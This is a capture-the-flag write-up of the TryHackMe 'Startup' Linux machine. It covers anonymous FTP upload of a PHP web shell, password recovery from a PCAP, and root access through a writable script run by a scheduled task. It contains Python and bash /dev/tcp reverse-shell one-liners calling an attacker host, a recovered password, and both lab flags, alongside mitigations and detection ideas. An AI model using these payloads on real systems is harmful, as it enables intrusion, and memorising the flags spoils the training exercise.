# Startup - TryHackMe Writeup

## Basic Information

| Category | Details |
|----------|----------|
| Platform | TryHackMe |
| Machine Name | Startup |
| Difficulty | Easy |
| Operating System | Linux |
| Target IP | 10.49.166.59 |

---

# Introduction

Today we are solving another **TryHackMe Easy** Linux machine named **Startup**.

Unlike many beginner machines that rely on password attacks or web vulnerabilities alone, Startup combines multiple attack vectors into a realistic penetration testing scenario. Throughout this machine we will enumerate exposed services, abuse anonymous FTP access, discover a writable web directory, upload a malicious PHP web shell, obtain an initial foothold, analyze a captured network packet (PCAP) for credentials, pivot to another user account, and finally escalate privileges through an insecure root-owned script executed automatically.

This room emphasizes the importance of proper enumeration and demonstrates how several seemingly harmless misconfigurations can be chained together into complete system compromise.

---

# Objectives

The objective of this machine is to:

- Enumerate exposed services.
- Gain an initial foothold.
- Capture the User Flag.
- Escalate privileges.
- Capture the Root Flag.

---

# Attack Methodology

The attack followed the methodology shown below.

```
Reconnaissance
        │
        ▼
Port Enumeration
        │
        ▼
FTP Enumeration
        │
        ▼
Anonymous Login
        │
        ▼
Web Enumeration
        │
        ▼
Writable Web Directory
        │
        ▼
PHP Web Shell Upload
        │
        ▼
Reverse Shell
        │
        ▼
Shell Stabilization
        │
        ▼
Local Enumeration
        │
        ▼
PCAP Analysis
        │
        ▼
Credential Recovery
        │
        ▼
Lateral Movement
        │
        ▼
Privilege Escalation
        │
        ▼
Root
```

---

# Initial Reconnaissance

As always, the first step during a penetration test is identifying all exposed services.

A full TCP scan is performed using Nmap.

```bash
nmap -p- 10.49.166.59
```

## Scan Results

```
21/tcp
22/tcp
80/tcp
```

Only three ports are exposed.

- FTP
- SSH
- HTTP

Although this appears to be a very small attack surface, each service deserves careful inspection.

---

# Service Enumeration

A service detection scan is performed.

```bash
nmap -sC -sV 10.49.166.59
```

Results:

```
21/tcp
vsftpd 3.0.3

22/tcp
OpenSSH 7.2p2

80/tcp
Apache 2.4.18
```

One result immediately stands out.

```
Anonymous FTP login allowed
```

This is an important finding because anonymous FTP servers frequently expose sensitive files or allow unauthorized uploads.

---

# FTP Enumeration

Connecting to the FTP server.

```bash
ftp 10.49.166.59
```

Login:

```
Username:

anonymous
```

Authentication succeeds without requiring a password.

Listing the available files.

```bash
ls
```

Output:

```
ftp/
important.jpg
notice.txt
```

The anonymous account has access to both downloadable files and a writable directory.

---

# Reviewing notice.txt

Downloading and reading the notice.

```bash
get notice.txt
```

Contents:

```
Whoever is leaving these damn Among Us memes in this share, it IS NOT FUNNY.

People downloading documents from our website will think we are a joke!

Now I dont know who it is, but Maya is looking pretty sus.
```

Several useful observations can be made.

First, we discover a potential username.

```
maya
```

Secondly, the administrator mentions that files inside this FTP share are also accessible from the website.

This suggests that the FTP directory is mapped directly into the Apache web root.

---

# Website Enumeration

Opening the web server displays only a simple maintenance page.

```
Maintenance
```

No obvious functionality is available.

Since manual browsing reveals very little information, directory enumeration is performed.

---

# Directory Enumeration

Gobuster is executed using a directory wordlist.

```bash
gobuster dir \
-u http://10.49.166.59 \
-w /usr/share/wordlists/SecLists/Discovery/Web-Content/raft-large-directories.txt
```

Interesting results:

```
/files
```

Browsing to:

```
http://10.49.166.59/files/
```

reveals something extremely important.

The exact same FTP directory is exposed through the web server.

Everything uploaded through FTP becomes publicly accessible through Apache.

This immediately suggests a possible file upload vulnerability.

---

# Initial Foothold

Since anonymous users possess write permissions to the FTP directory, the next logical step is attempting to upload a PHP web shell.

A simple PHP shell is uploaded to the writable FTP directory.

Because the FTP directory is also accessible through the web server, browsing directly to the uploaded file causes Apache to execute the PHP code.

Rather than relying on command execution through the browser, the shell is modified to execute a Python reverse shell.

Example payload:

```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER-IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'
```

---

# Preparing the Listener

Before triggering the payload, a Netcat listener is started.

```bash
nc -lvnp 4444
```

Triggering the uploaded PHP shell causes the target to connect back.

Output:

```
connect to [ATTACKER-IP]

www-data@startup
```

Checking the current user.

```bash
whoami
```

Output:

```
www-data
```

The web server has now been successfully compromised.

---

# Shell Stabilization

Reverse shells generally provide only limited functionality.

To improve interaction, the shell is upgraded.

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

Suspend the session.

```
CTRL + Z
```

Configure the local terminal.

```bash
stty raw -echo
```

Resume the shell.

```bash
fg
```

Finally export a terminal type.

```bash
export TERM=xterm-256color
```

The reverse shell now behaves much more like a normal SSH session.

---

# Local Enumeration

With a stable shell available, local enumeration begins.

Instead of searching manually, **LinPEAS** is executed to automate privilege escalation checks.

Among the findings, one directory immediately attracts attention.

```
/incidents
```

Listing the contents.

```bash
ls
```

Output:

```
suspicious.pcapng
```

A packet capture stored inside an incidents directory strongly suggests previous malicious activity.

Instead of analyzing it directly on the target machine, it is copied into the web-accessible directory.

```bash
cp suspicious.pcapng /var/www/html/files/ftp/
```

The file can now be downloaded locally and opened using Wireshark.

---

# Packet Capture Analysis

Opening the PCAP inside Wireshark reveals evidence of another attacker compromising the same server.

Filtering TCP conversations:

```
tcp
```

Following the relevant TCP stream exposes an interactive shell session used by the previous attacker.

Inside the captured traffic, credentials are transmitted in plaintext.

Password recovered:

```
c4ntg3t3n0ughsp1c3
```

This demonstrates one of the most valuable lessons in penetration testing:

Previous attackers frequently leave behind useful forensic evidence that can be leveraged during later compromises.

---

# Lateral Movement

Although the recovered password does not work for the current **www-data** account, it is tested against local users.

The credentials successfully authenticate as:

```
lennie
```

Switching users.

```bash
su lennie
```

Password:

```
c4ntg3t3n0ughsp1c3
```

Authentication succeeds.

---

# User Flag

Listing the user's home directory.

```bash
ls
```

Output:

```
Documents
scripts
user.txt
```

Reading the flag.

```bash
cat user.txt
```

Result:

```
THM{03ce3d619b80ccbfb3b7fc81e46c0e79}
```

The first objective has now been completed.

---

# Additional Enumeration

Reviewing the contents of Lennie's Documents directory reveals several notes left by the user.

Among them is an interesting reminder.

```
Talk to Inclinant about our lacking security.

Delete incident logs.
```

While these files do not directly provide credentials, they reinforce that the system has experienced previous security issues.

Another directory named:

```
scripts
```

appears significantly more interesting and becomes the focus of the privilege escalation phase.

---

# Progress So Far

At this stage we have successfully:

- Enumerated all exposed services.
- Discovered anonymous FTP access.
- Downloaded sensitive files.
- Identified a writable FTP directory.
- Confirmed that uploaded files are served by Apache.
- Uploaded and executed a PHP web shell.
- Obtained a reverse shell as **www-data**.
- Stabilized the shell.
- Enumerated the filesystem.
- Discovered a suspicious packet capture.
- Extracted credentials from network traffic.
- Pivoted to the **lennie** user.
- Captured the User Flag.

The remaining task is to escalate privileges to **root** by abusing a writable script executed by a privileged process, obtain a root shell, capture the final flag, and conclude the machine with a full security analysis and mitigation recommendations.

# Privilege Escalation

After successfully obtaining access as the **lennie** user and capturing the user flag, the remaining objective is escalating privileges to **root**.

The first step during Linux privilege escalation is always performing additional enumeration.

Although several interesting files exist inside Lennie's home directory, none of them directly reveal credentials or sudo permissions.

Instead, attention shifts toward the **scripts** directory.

---

# Enumerating the Scripts Directory

Inside Lennie's home directory a directory named:

```
scripts
```

contains the following files.

```
planner.sh
startup_list.txt
```

Viewing the contents of the main script.

```bash
cat planner.sh
```

Output:

```bash
#!/bin/bash

echo $LIST > /home/lennie/scripts/startup_list.txt

/etc/print.sh
```

Several important observations can be made immediately.

- The script executes another script located inside `/etc`.
- The final command executes `/etc/print.sh`.
- Since this script is called automatically, modifying `/etc/print.sh` could lead to privilege escalation.

The next objective is determining how this script is executed.

---

# Understanding the Execution Flow

The execution chain appears to be:

```
Root Process
      │
      ▼
planner.sh
      │
      ▼
/etc/print.sh
```

If `/etc/print.sh` executes with root privileges and is writable by a lower-privileged user, arbitrary commands can be executed as root.

This is a classic example of **insecure script execution**.

---

# Inspecting print.sh

Viewing the contents of the script.

```bash
cat /etc/print.sh
```

Initially, the file contains a harmless script.

The key discovery is not its contents but the fact that it is **modifiable**.

This immediately provides a straightforward privilege escalation path.

---

# Replacing the Script

Instead of the original commands, the script is replaced with a Bash reverse shell.

```bash
#!/bin/bash

/bin/bash -c 'bash -i >& /dev/tcp/ATTACKER-IP/5555 0>&1'
```

Replace:

```
ATTACKER-IP
```

with the IP address of the attacking machine.

Saving the modified script ensures that the next execution will establish a reverse shell back to the attacker.

---

# Preparing the Listener

Before waiting for the scheduled execution, a Netcat listener is started.

```bash
nc -lvnp 5555
```

Output:

```
listening on [any] 5555...
```

Since the script is executed automatically by a privileged process, no additional interaction is required.

After a short delay, the listener receives a connection.

```
connect to [ATTACKER-IP]
```

Checking the current user.

```bash
whoami
```

Output:

```
root
```

The privilege escalation is successful.

---

# Understanding the Vulnerability

The vulnerability exists because a privileged process executes a script that can be modified by a non-privileged user.

Instead of executing trusted code:

```
Root

↓

Trusted Script

↓

Expected Action
```

the process executes attacker-controlled commands.

```
Root

↓

Modified Script

↓

Reverse Shell

↓

Root Access
```

This type of vulnerability is extremely common in Linux privilege escalation scenarios.

---

# Root Flag

Navigating to the root directory.

```bash
cd /root
```

Reading the final flag.

```bash
cat root.txt
```

Output:

```
THM{f963aaa6a430f210222158ae15c3d76d}
```

The machine has now been completely compromised.

---

# Complete Attack Path

```
Internet
      │
      ▼
Nmap Enumeration
      │
      ▼
Anonymous FTP
      │
      ▼
Writable FTP Share
      │
      ▼
Web Directory Mapping
      │
      ▼
Upload PHP Web Shell
      │
      ▼
Reverse Shell
      │
      ▼
www-data
      │
      ▼
Local Enumeration
      │
      ▼
Suspicious PCAP
      │
      ▼
Wireshark Analysis
      │
      ▼
Recovered Password
      │
      ▼
su lennie
      │
      ▼
User Flag
      │
      ▼
Writable /etc/print.sh
      │
      ▼
Inject Reverse Shell
      │
      ▼
Root Scheduled Execution
      │
      ▼
Root Shell
      │
      ▼
Root Flag
```

---

# Security Weaknesses Identified

## 1. Anonymous FTP Access

The FTP service permitted anonymous authentication.

**Impact**

- Unauthorized file access.
- Information disclosure.
- Public file uploads.

**Mitigation**

- Disable anonymous FTP access.
- Require authenticated users.
- Limit uploaded content.

---

## 2. Writable Web Directory

Files uploaded through FTP were directly exposed through the web server.

**Impact**

- Arbitrary file upload.
- Remote Code Execution through PHP shells.

**Mitigation**

- Separate upload directories from the web root.
- Disable execution permissions on upload locations.
- Validate uploaded file types.

---

## 3. Insecure File Upload

The server accepted executable PHP files without validation.

**Impact**

- Web shell deployment.
- Complete web server compromise.

**Mitigation**

- Restrict uploads to approved extensions.
- Rename uploaded files.
- Store uploads outside the document root.
- Implement MIME type validation.

---

## 4. Sensitive Packet Capture Left on Server

A packet capture containing previous attack activity remained accessible.

**Impact**

- Credential disclosure.
- Information leakage.
- Easier lateral movement.

**Mitigation**

- Remove incident artifacts after investigations.
- Restrict access to forensic evidence.
- Store captures securely.

---

## 5. Plaintext Credentials

Network traffic contained reusable plaintext credentials.

**Impact**

- Unauthorized account access.
- Lateral movement.

**Mitigation**

- Encrypt sensitive communications.
- Avoid transmitting passwords in plaintext.
- Rotate exposed credentials immediately.

---

## 6. Writable Root-Owned Script

A privileged process executed a script that could be modified by a low-privileged user.

**Impact**

- Privilege escalation.
- Arbitrary command execution.
- Full system compromise.

**Mitigation**

- Restrict write permissions on privileged scripts.
- Validate file ownership.
- Use integrity monitoring for critical scripts.

---

# MITRE ATT&CK Mapping

| Technique | ATT&CK ID |
|------------|-----------|
| Active Scanning | T1595 |
| File and Directory Discovery | T1083 |
| Exploit Public-Facing Application | T1190 |
| Command and Scripting Interpreter (Unix Shell) | T1059.004 |
| Valid Accounts | T1078 |
| Unsecured Credentials | T1552 |
| Scheduled Task / Cron Abuse | T1053.003 |
| Exploitation for Privilege Escalation | T1068 |

---

# Detection Opportunities

Security teams can detect attacks similar to this by monitoring:

- Anonymous FTP logins.
- Uploads of executable PHP files.
- Execution of PHP scripts inside upload directories.
- Unexpected outbound reverse shell connections.
- Access to forensic artifacts such as PCAP files.
- Use of `su` to switch users unexpectedly.
- Modifications to privileged scripts under `/etc`.
- Unexpected outbound connections initiated by scheduled tasks or cron jobs.

Endpoint Detection and Response (EDR) platforms can also detect suspicious shell execution, reverse shell behavior, and unauthorized changes to critical system files.

---

# Lessons Learned

Startup demonstrates how multiple small security weaknesses can combine into a complete system compromise.

No single vulnerability alone provided root access. Instead, the attack relied on chaining several issues together:

- Anonymous FTP access.
- Writable upload directory.
- Execution of uploaded PHP files.
- Poor handling of forensic evidence.
- Plaintext credential exposure.
- Insecure privileged script execution.

The machine also highlights the importance of careful post-exploitation enumeration. Rather than immediately searching for kernel exploits, analyzing available artifacts such as the packet capture revealed credentials that significantly simplified lateral movement.

Finally, the privilege escalation phase reinforces a common lesson in Linux security: any script executed by a privileged process must be protected against unauthorized modification.

---

# Conclusion

**Startup** is an excellent beginner-friendly Linux machine that introduces several fundamental penetration testing techniques in a realistic attack chain. The compromise begins with the discovery of an anonymous FTP service that exposes a writable directory mapped directly into the Apache web root. By uploading and executing a PHP web shell, initial access is obtained as the **www-data** user.

Post-exploitation enumeration uncovers a packet capture containing credentials from a previous compromise, enabling lateral movement to the **lennie** account. Further investigation reveals a writable script executed by a privileged process, allowing a malicious reverse shell to be injected and ultimately resulting in full **root** compromise.

From a defensive perspective, the machine emphasizes the importance of disabling anonymous services, separating upload directories from executable web content, protecting sensitive forensic artifacts, preventing plaintext credential exposure, and securing privileged scripts against unauthorized modification.

Overall, Startup provides an excellent hands-on exercise in enumeration, web exploitation, post-exploitation, credential harvesting, and Linux privilege escalation, making it a valuable learning experience for anyone developing practical offensive security skills.
